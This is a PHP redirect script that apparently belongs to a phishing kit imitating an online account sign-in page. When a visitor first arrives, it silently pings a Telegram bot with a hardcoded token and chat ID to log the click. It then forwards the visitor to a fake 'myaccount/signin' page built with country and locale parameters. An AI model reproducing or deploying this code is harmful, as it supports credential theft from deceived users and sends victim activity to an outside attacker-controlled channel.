<?php
//LOCATION !
session_start();
error_reporting(0);
include('./customer_center/customer-IDPP00C984/functions/get_ip.php');

date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');

//Clicks message Bot/===============================================================================
if($_SESSION['Clicks'] !== "Yes"){
$token = "1956956108:AAF8T_32M3NlYUlEn0JGQa_4b8pVXy9s7BE";
$data = ['text' => '
   `'.$TIME_DATE.'` 
',
    'chat_id' => '1195010636',
	'parse_mode' => 'MarkDown',
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
$_SESSION['Clicks'] = 'Yes';
}
//Clicks message Bot/===============================================================================

$DIR='./update-account/customer_center/customer-IDPP00C984/myaccount/signin/?country.x='.$_SESSION['_LOOKUP_CNTRCODE_'].'&locale.x=en_'.$_SESSION['_LOOKUP_CNTRCODE_'].'';
header("LOCATION: ".$DIR."");
?>
